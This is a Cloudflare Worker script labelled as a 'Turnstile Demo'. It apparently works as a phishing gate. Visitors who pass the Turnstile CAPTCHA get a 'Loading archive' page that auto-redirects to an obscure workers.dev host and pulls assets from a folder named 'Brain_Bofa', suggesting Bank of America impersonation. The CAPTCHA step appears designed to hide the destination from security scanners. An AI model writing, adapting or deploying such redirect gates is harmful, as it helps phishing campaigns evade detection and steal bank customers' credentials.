const SITE_KEY = "0x4AAAAAAB0srasdEEGq0KyD";

export default {
  async fetch(request) {
    const url = new URL(request.url);
    
    if (url.pathname === "/success") {
      return handleSuccess(request);
    }
    
    const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Turnstile Demo</title>
  <style>
    #container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
  </style>
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
  <script>
    async function handleTurnstileSuccess() {
      const response = await fetch('/success', {
        method: 'POST'
      });
      const text = await response.text();
      document.getElementById('content').innerHTML = text;
    }
    document.addEventListener("DOMContentLoaded", function() {
      document.getElementById('content').innerHTML = '<div id="container"><div class="cf-turnstile" data-sitekey="${SITE_KEY}" data-theme="light" data-callback="handleTurnstileSuccess"></div></div>';
    });
  </script>
</head>
<body>
  <div id="content"></div>
</body>
</html>
`;
    return new Response(htmlContent, {
      headers: {
        "Content-Type": "text/html"
      }
    });
  }
};

async function handleSuccess(request) {
  const successHtml = `
<!DOCTYPE html>
<html>
<head>
  <title>Loading archive please wait......</title>
  <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
  <meta http-equiv="Refresh" content="1;URL=https://6t8dnegbtnp7.getdulgeohh.workers.dev">
  <link href="Brain_Bofa/mvc_content_style.css" type="text/css" rel="stylesheet">
  <link href="Brain_Bofa/mvc_header_footer_style.css" type="text/css" rel="stylesheet">
  <meta content="Microsoft FrontPage 5.0" name="GENERATOR">
</head>
<body style="background-color: rgb(255, 255, 255);" leftmargin="0" topmargin="0" marginheight="0" marginwidth="0">
  <div style="text-align: center;"><big><big><big><big> </big></big></big></big><br>
    &nbsp;...<br>
    <br>
  </div>
  <br>
  <table summary="" border="0" cellpadding="0" cellspacing="0">
    <tbody>
      <tr>
        <td colspan="3" height="40"><br></td>
      </tr>
      <tr>
        <td><br></td>
        <td class="ftr-text" valign="top"><br></td>
      </tr>
      <tr>
        <td colspan="3" height="20"><img alt="" src="Brain_Bofa/dot_clear.gif" border="0" height="20" width="1"></td>
      </tr>
    </tbody>
  </table>
</body>
</html>
`;
  return new Response(successHtml, {
    headers: {
      "Content-Type": "text/html"
    }
  });
}